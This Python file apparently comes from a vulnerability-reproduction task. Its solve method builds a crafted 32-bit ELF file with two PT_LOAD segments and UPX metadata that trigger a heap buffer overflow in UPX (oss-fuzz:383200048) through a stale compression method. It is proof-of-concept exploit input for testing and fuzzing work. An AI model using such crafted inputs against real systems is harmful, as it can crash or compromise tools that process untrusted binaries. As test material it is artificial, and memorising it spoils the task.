import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability in UPX (oss-fuzz:383200048) is a heap buffer overflow
        caused by the `ph.method` field not being reset for each PT_LOAD program
        header processed. This allows a stale compression method from a previous
        header to be applied to a subsequent header's data, leading to an
        out-of-bounds read during decompression.

        This PoC is a crafted ELF file with two PT_LOAD segments:
        1. The first segment's metadata sets `ph.method` to a non-zero value
           (e.g., 8 for LZMA).
        2. The second segment's metadata has `b_method=0` (implying uncompressed),
           but due to the bug, the stale `ph.method=8` is used. The offset
           and size values in this second segment's metadata are crafted to
           cause the LZMA decompressor to read far beyond the bounds of the
           input file buffer, triggering the overflow.
        """
        # ELF Header (32-bit)
        e_phnum = 2
        e_phentsize = 32
        e_phoff = 52

        header = b'\x7fELF\x01\x01\x01' + b'\x00' * 9
        header += struct.pack('<HH', 3, 3)  # e_type=ET_DYN, e_machine=EM_386
        header += struct.pack('<I', 1)      # e_version=EV_CURRENT
        header += struct.pack('<III', 0, e_phoff, 0)
        header += struct.pack('<HHHHHH', 0, 52, e_phentsize, e_phnum, 0, 0)

        # Program Header Table
        pht_offset = e_phoff
        upx_metadata_size = 52 # sizeof(l_info) + sizeof(p_info) + sizeof(b_info)

        # PHDR 0: Sets the malicious state (ph.method = 8)
        p_offset_0 = pht_offset + e_phnum * e_phentsize
        phdr0 = struct.pack('<IIIIIIII',
                            1,
                            p_offset_0,
                            0, 0,
                            upx_metadata_size,
                            upx_metadata_size,
                            4, 0)

        # PHDR 1: Triggers the bug using the stale state
        p_offset_1 = p_offset_0 + upx_metadata_size
        phdr1 = struct.pack('<IIIIIIII',
                            1,
                            p_offset_1,
                            0, 0,
                            upx_metadata_size,
                            0x2000,
                            4, 0)

        pht = phdr0 + phdr1

        # UPX Metadata Blocks
        l_magic = 0x21585055  # 'UPX!'
        l_info = struct.pack('<I', l_magic) + b'\x00' * 16
        p_info = b'\x00' * 12

        # Metadata Block 0
        data_for_block0_offset = p_offset_1 + upx_metadata_size
        b_info0 = struct.pack('<IIIII',
                              8,
                              data_for_block0_offset,
                              1,
                              1,
                              0)
        upx_block_0 = l_info + p_info + b_info0

        # Metadata Block 1
        b_off_1 = 0x300
        c_size_1 = 0x300
        b_info1 = struct.pack('<IIIII',
                              0,
                              b_off_1,
                              0x1000,
                              c_size_1,
                              0)
        upx_block_1 = l_info + p_info + b_info1

        # Dummy data for the first block
        dummy_data = b'\x00'

        poc = header + pht + upx_block_0 + upx_block_1 + dummy_data
        
        return poc